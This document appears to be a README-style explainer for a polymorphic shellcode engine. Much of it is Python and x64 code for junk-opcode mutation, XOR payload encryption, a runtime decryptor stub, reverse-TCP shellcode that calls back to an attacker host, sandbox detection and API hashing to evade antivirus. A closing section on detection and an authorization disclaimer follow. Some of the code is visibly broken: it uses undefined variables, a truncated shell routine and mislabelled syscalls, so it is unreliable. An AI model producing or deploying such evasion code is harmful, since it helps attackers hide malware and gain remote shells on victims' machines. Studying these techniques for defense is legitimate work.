# 🔀 Polymorphic Shellcode Engine - Complete Code Explanation

## 📋 Table of Contents
1. [Project Overview](#project-overview)
2. [Architecture & File Structure](#architecture--file-structure)
3. [Core Components - Deep Dive](#core-components---deep-dive)
4. [Security Principles & Evasion Techniques](#security-principles--evasion-techniques)
5. [How IDS/AV Detects This](#how-idsav-detects-this)
6. [Workflow Diagram](#workflow-diagram)

---

## Project Overview

The **Polymorphic Shellcode Engine** is an educational tool that demonstrates:
- **Polymorphism**: Code that changes its appearance while maintaining functionality
- **Encryption**: Protecting shellcode from static analysis
- **Evasion**: Techniques to evade sandbox detection and analysis tools
- **Red Team Operations**: How adversaries might obfuscate malicious payloads

### 🎯 Key Objective
Generate shellcode that looks different each time it runs, making signature-based detection ineffective.

---

## Architecture & File Structure

```
Polymorphic-Shellcode-Engine/
├── src/
│   ├── engine.py              # Core polymorphic engine
│   ├── payload_generator.py   # Shellcode assembly & generation
│   ├── evasion.py            # Anti-analysis & sandbox detection
│   └── utils.py              # Helper functions (hexdump, disassembly)
├── examples/
│   ├── reverse_tcp.py        # Example: Generate reverse TCP payload
│   └── cobalt_strike.py      # Example: Cobalt Strike integration
├── tests/
│   └── test_engine.py        # Unit tests
└── README.md
```

### File Placement Logic
- **src/**: Core engine logic (reusable components)
- **examples/**: Proof-of-concept demonstrations
- **tests/**: Validation & security testing
- **docs/**: Documentation & guides

---

## Core Components - Deep Dive

### 1. **engine.py** - The Polymorphic Engine

#### Class: `PolymorphicEngine`

```python
class PolymorphicEngine:
    def __init__(self, key=None):
        self.key = key or self.generate_key()
```

**Purpose**: Central hub for all mutation, encryption, and decryption operations.

---

#### Method: `generate_key()`

```python
def generate_key(self):
    """Generate a 32-byte key using PBKDF2"""
    salt = random.randbytes(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000
    )
    return kdf.derive(random.randbytes(32))
```

**What it does:**
1. Creates a random 16-byte **salt**
2. Uses **PBKDF2** (Password-Based Key Derivation Function 2) with:
   - **SHA256** hashing algorithm
   - **100,000 iterations** (computationally expensive)
3. Derives a strong **32-byte encryption key**

**Why this matters:**
- **PBKDF2** is cryptographically strong - prevents rainbow table attacks
- **100,000 iterations** make brute-force attacks computationally expensive
- **Random salt** ensures same input produces different keys
- Each payload gets a unique key

**Security Principle**: Key derivation prevents attackers from easily decrypting the payload.

---

#### Method: `mutate(shellcode)`

```python
def mutate(self, shellcode):
    """Apply polymorphism: junk insertion, register swapping, etc."""
    mutated = bytearray(shellcode)

    # Insert random NOP-like junk
    junk_opcodes = [
        b'\x90',              # NOP (no operation)
        b'\xeb\x0c',          # JMP $+14 (jump forward)
        b'\x8d\x40\x00'       # LEA EAX,[EAX+00] (load effective address, no-op)
    ]
    for _ in range(random.randint(1, 5)):
        pos = random.randint(0, len(mutated))
        mutated[pos:pos] = junk_opcodes[random.randint(0, len(junk_opcodes)-1)]

    # Swap registers
    register_swaps = {
        b'\x50': b'\x51',     # PUSH EAX -> PUSH ECX
        b'\x53': b'\x55'      # PUSH RBX -> PUSH RBP
    }
    for op, replacement in register_swaps.items():
        if op in mutated:
            mutated = mutated.replace(op, replacement)

    return bytes(mutated)
```

**What it does:**

1. **Junk Insertion**: Adds 1-5 harmless instructions that do nothing useful
   - `NOP` (0x90): Does nothing
   - `JMP $+14`: Jumps past the junk, returns to real code
   - `LEA EAX,[EAX+00]`: Loads address into EAX but doesn't change functionality

2. **Register Swapping**: Replaces registers with functionally equivalent ones
   - `PUSH EAX` → `PUSH ECX`
   - Same result, different bytes

**Why this matters:**
- Static signatures look for exact byte sequences
- By changing bytes while keeping functionality, signature matching fails
- Each mutation is different → different hash each time

**Polymorphism Principle**: Code that changes appearance without changing behavior.

---

#### Method: `encrypt(shellcode)`

```python
def encrypt(self, shellcode):
    """XOR encrypt shellcode with dynamic key"""
    encrypted = bytearray()
    key = self.key[:len(shellcode)]
    for i in range(len(shellcode)):
        encrypted.append(shellcode[i] ^ key[i % len(key)])
    return encrypted
```

**What it does:**
1. Takes each byte of shellcode
2. XORs it with corresponding key byte
3. Uses modulo to cycle through key if shellcode is longer

**XOR Operation Example:**
```
Shellcode byte: 0x48
Key byte:       0x37
XOR result:     0x48 ^ 0x37 = 0x7F

To decrypt: 0x7F ^ 0x37 = 0x48 (original)
```

**Why XOR?**
- Fast decryption in assembly
- Simple to implement in shellcode
- When combined with junk, evades detection

**Security Note**: XOR alone is weak, but it's fast for runtime decryption.

---

#### Method: `generate_decryptor_stub()`

```python
def generate_decryptor_stub(self):
    """Generate architecture-specific decryptor (x64 example)"""
    stub = (
        b"\x48\x31\xc9"              # xor rcx, rcx (clear rcx)
        b"\x48\x81\xe9" + struct.pack("<I", len(shellcode)) +
                                     # sub rcx, -len (set counter)
        b"\x48\x8d\x05\xef\xff\xff\xff"
                                     # lea rax, [rip - 11] (get current position)
        b"\x48\x31\xd2"              # xor rdx, rdx (clear rdx)
        b"\x80\x34\x08" + struct.pack("B", self.key[0])
                                     # xor byte [rax+rcx], key_byte
        b"\x48\xff\xc1"              # inc rcx (increment counter)
        b"\x48\x39\xc8"              # cmp rax, rcx (compare)
        b"\x75\xf5"                  # jne loop (jump if not equal)
    )
    return stub
```

**What it does:**
This is **x64 assembly** that:
1. Initializes RCX counter to 0
2. Gets current instruction pointer with LEA
3. Loops through each byte of encrypted payload
4. XORs each byte with key to decrypt
5. When done, jumps to decrypted shellcode

**Decryption Loop (in plain English):**
```
rcx = 0
while rcx < payload_length:
    encrypted_shellcode[rax + rcx] ^= key_byte
    rcx++
    if rcx != payload_length:
        jump to loop
    else:
        execute decrypted shellcode
```

**Why this matters:**
- Decryption happens at **runtime in memory**
- Antivirus examining disk sees encrypted blob
- By the time AV examines memory, payload already executing
- This is called **in-situ decryption**

---

### 2. **payload_generator.py** - Shellcode Assembly

```python
from keystone import Ks, KsError

class PayloadGenerator:
    def __init__(self, arch=KS_ARCH_X86, mode=KS_MODE_64):
        self.ks = Ks(arch, mode)
```

**What it does:**
- Uses **Keystone Engine** (assembler library)
- Converts assembly code → raw bytes (shellcode)
- Supports x86 (32-bit) and x64 (64-bit) architectures

---

#### Method: `assemble(assembly_code)`

```python
def assemble(self, assembly_code):
    try:
        encoding, _ = self.ks.asm(assembly_code)
        return bytes(encoding)
    except KsError as e:
        print(f"Assembly error: {e}")
        return None
```

**Example:**
```python
asm_code = """
mov rax, 1
mov rdi, 1
mov rsi, message
mov rdx, 13
syscall      # write syscall
"""
shellcode = payload_generator.assemble(asm_code)
# Returns: b'\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00...'
```

---

#### Method: `generate_reverse_tcp(ip, port)`

```python
def generate_reverse_tcp(self, ip, port):
    """Generate reverse TCP shellcode for x64"""
    hex_ip = ''.join([f"{int(octet):02x}" for octet in ip.split('.')[::-1]])
    hex_port = f"{port:04x}"

    asm = f"""
        ; x64 reverse TCP shell
        mov rax, 0x{hex_ip}{hex_port}0002
        push rax
        mov rsi, rsp
        xor rdx, rdx
        mov rdi, 2
        mov rax, 0x2a
        syscall
        ; ... rest of shellcode ...
    """
    return self.assemble(asm)
```

**What it does:**

1. **IP Conversion**: 192.168.1.1 → reversed hex → 0x0101a8c0
2. **Port Conversion**: 4444 → 0x115c
3. **Builds assembly** that:
   - Creates socket (syscall 2)
   - Connects to attacker IP:port
   - Spawns shell on connection

**Socket Creation (syscall numbering):**
- 0x29 = socket syscall
- 0x2a = connect syscall
- Syscalls differ on x86/x64/ARM

---

### 3. **evasion.py** - Anti-Analysis Techniques

```python
class EvasionTechniques:
    @staticmethod
    def is_sandbox():
        """Check for common sandbox artifacts"""
        # Check for VM hypervisor
        try:
            cpuid = ctypes.windll.kernel32.IsProcessorFeaturePresent
            if cpuid(0x40000000):  # Hypervisor present
                return True
        except:
            pass

        # Check for low RAM
        if sys.platform == 'win32':
            mem = ctypes.c_ulonglong()
            ctypes.windll.kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(mem))
            return mem.value < 2 * 1024**3  # Less than 2GB?
        return False
```

**What it does:**

1. **Detects Hypervisor**: Checks CPUID 0x40000000
   - Real CPU: Not present
   - Virtual Machine: Present

2. **Detects Low RAM**: VMs often have 1GB RAM
   - Real system: Usually 4GB+
   - Sandbox: Usually 1-2GB

**Purpose**: If running in sandbox, don't execute payload → avoid analysis tools

---

```python
@staticmethod
def api_hashing(library, function_name):
    """Resolve APIs via hash to avoid string detection"""
    lib = ctypes.windll.LoadLibrary(library)
    for export in lib._functions:
        if hash(export) == precomputed_hash:
            return getattr(lib, export)
    return None
```

**What it does:**
- Instead of calling `GetProcAddress("CreateRemoteThread")`
- Uses **hash of function name** to hide strings
- Antivirus can't search for "CreateRemoteThread" string

**Why it matters:**
- Strings are easy to detect
- Hashes are hard to reverse
- Firewall/AV tools search for suspicious function names

---

### 4. **utils.py** - Analysis Tools

```python
def hexdump(shellcode, length=16):
    """Generate hexdump-style representation"""
    return "\n".join([
        f"{i:04x}  {binascii.hexlify(data).decode('utf-8')}  {repr(data)[2:-1]}"
        for i, data in enumerate([...])
    ])
```

**Output example:**
```
0000  48 31 c0 48 31 ff 48 31  f6 48 31 d2 4d 31 c0 6a  |H1.H1.H1.H1.M1.j|
0010  02 5f 6a 01 5e 6a 06 5a  6a 29 58 0f 05 49 89 c0  |._j.^j.Zj)X..I..|
```

---

```python
def disassemble(shellcode, arch=CS_ARCH_X86, mode=CS_MODE_64):
    """Disassemble shellcode using Capstone"""
    md = Cs(arch, mode)
    disasm = []
    for i in md.disasm(shellcode, 0x1000):
        disasm.append(f"0x{i.address:x}:\t{i.mnemonic}\t{i.op_str}")
    return "\n".join(disasm)
```

**Output example:**
```
0x1000:	xor	rax, rax
0x1003:	xor	rdi, rdi
0x1006:	mov	rax, 0x2a
0x100d:	syscall
```

---

## Security Principles & Evasion Techniques

### 1. **Polymorphism**
```
Original:  [JMP to B] [B: malicious code]
Mutated 1: [NOP] [JMP to C] [C: malicious code]
Mutated 2: [NOP] [NOP] [JMP to D] [D: malicious code]
```
Each version has different bytes but same functionality.

**Detection Obstacle**: Signature-based AV fails (different hash each time)

---

### 2. **Encryption + Runtime Decryption**
```
Disk:        [Encrypted shellcode] (looks benign)
            ↓
Memory:      [Decryptor] → [Decrypts shellcode] → [Executes]
```

**Detection Obstacle**: Static analysis only sees encrypted blob

---

### 3. **Sandbox Evasion**
```
if (is_sandbox_detected()):
    return (don't execute)
else:
    execute_payload()
```

**Detection Obstacle**: Payload won't execute in analysis environment

---

### 4. **API Hashing**
```
Normal:  LoadLibrary("kernel32.dll")
         GetProcAddress(hLib, "CreateRemoteThread")

Hashed:  hash_map = {0x8f3b91c2: CreateRemoteThread_func}
         call_by_hash(0x8f3b91c2)
```

**Detection Obstacle**: String signatures won't find "CreateRemoteThread"

---

## How IDS/AV Detects This

### 1. **Behavioral Detection**
- Monitors process creation
- Detects network connections to suspicious IP:port
- Alerts on reverse shell pattern

**Example**: Process X unexpectedly connects to external IP

---

### 2. **Memory Analysis**
- Inspects process memory during execution
- Looks for:
  - Encrypted blobs
  - Double-XOR operations
  - Suspicious syscalls
  - Process injection patterns

**Detection Point**: When shellcode is decrypted in memory

---

### 3. **Emulation/Sandboxing**
- Runs suspicious files in isolated VM
- Monitors for:
  - Socket creation
  - File operations
  - Registry modifications
  - Privilege escalation

**Detection Point**: Payload behavior in sandbox (unless sandbox detection works)

---

### 4. **Heuristic Analysis**
- Detects junk instructions followed by real code
- Recognizes decryption patterns
- Flags NOP sleds with real instructions

**Detection Point**: Pattern matching on crypto operations

---

### 5. **Network-Level Detection**
- IDS/IPS monitors traffic for:
  - Reverse shell patterns
  - Shellcode byte sequences
  - Anomalous connections

**Detection Point**: Network traffic to attacker C2

---

## Workflow Diagram

```
┌─────────────────────┐
│  Original Shellcode │
│  (static, known)    │
└──────────┬──────────┘
           │
           ▼
┌──────────────────────────┐
│   PolymorphicEngine      │
│  ├─ mutate()            │  ← Add junk, swap registers
│  ├─ encrypt()           │  ← XOR with PBKDF2 key
│  └─ decryptor_stub()    │  ← Generate x64 decryptor
└──────────┬───────────────┘
           │
           ▼
┌──────────────────────────────┐
│  Final Payload               │
│  ┌─────────────────────────┐ │
│  │ Decryptor Stub (x64)    │ │
│  │ mov rax, [rip-11]       │ │
│  │ xor [rax+rcx], key      │ │
│  │ jne loop                │ │
│  └─────────────────────────┘ │
│  ┌─────────────────────────┐ │
│  │ Encrypted Payload       │ │
│  │ (looks random/benign)   │ │
│  └─────────────────────────┘ │
└──────────┬───────────────────┘
           │
           ▼
┌──────────────────────────────┐
│  Injection Methods            │
│  ├─ Direct: VirtualAlloc()    │
│  ├─ Process Injection         │
│  └─ DLL Hijacking             │
└──────────┬───────────────────┘
           │
           ▼
┌──────────────────────────────┐
│  Runtime Execution in Target  │
│  ┌─────────────────────────┐ │
│  │ Decryptor runs          │ │
│  │ Payload decrypted       │ │
│  │ Execute shellcode       │ │
│  └─────────────────────────┘ │
└──────────────────────────────┘
           │
           ▼
┌──────────────────────────────┐
│  Reverse Shell Connection     │
│  └─ Connects to 192.168.1.1   │
│  └─ Port 4444                 │
│  └─ Attacker gains shell      │
└──────────────────────────────┘
```

---

## Key Takeaways for EDR/IDS Testing

| Detection Layer | Bypass Method | Detection Opportunity |
|---|---|---|
| **Signature** | Polymorphism | Hash doesn't match |
| **Static Analysis** | Encryption | File looks benign |
| **Sandbox** | VM detection | Doesn't run in lab |
| **String Scan** | API hashing | Function names hidden |
| **Behavioral** | Evasion checks | Anomalous process behavior |
| **Network** | None | Outbound connection to attacker |

**Strongest Detection**: Network monitoring (hardest to evade)

---

## Educational Context

This code demonstrates **offensive security** concepts:
- ✅ Used in pentesting with authorization
- ✅ Used in CTF competitions
- ✅ Used in security research & education
- ✅ Used to test defensive systems

**Usage requires authorization** from system owner!

---

